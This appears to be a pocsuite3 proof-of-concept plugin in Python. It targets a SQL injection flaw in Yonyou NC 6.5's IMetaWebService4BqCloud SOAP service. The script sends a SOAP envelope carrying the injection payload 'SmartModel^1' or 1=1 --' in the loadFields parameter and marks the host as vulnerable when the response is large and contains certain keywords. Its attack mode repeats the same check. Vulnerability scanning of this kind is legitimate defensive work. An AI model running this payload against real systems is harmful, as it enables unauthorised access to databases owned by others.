#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友NC_IMetaWebService4BqCloud_sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''NC'''
    appVersion = '''6.5'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        headers = {
            "Soapaction": '"urn:loadFields"',
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Sa     fari/534.50",
            "Content-Type": "text/xml;charset=UTF-8"
        }
        data = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
   <soapenv:Header/>
   <soapenv:Body>
      <imet:loadFields>
         <!--Optional:-->
         <imet:string>SmartModel^1' or 1=1 --</imet:string>
      </imet:loadFields>
   </soapenv:Body>
</soapenv:Envelope>
        '''
        verify_url = make_verify_url(self.url, "/uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud", mod=0)
        resp = requests.post(verify_url, headers=headers, data=data, verify=False, timeout=15)
        if resp.status_code == 200 and len(resp.text) > 4000 and b"soap:Envelope" in resp.content and b"design" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
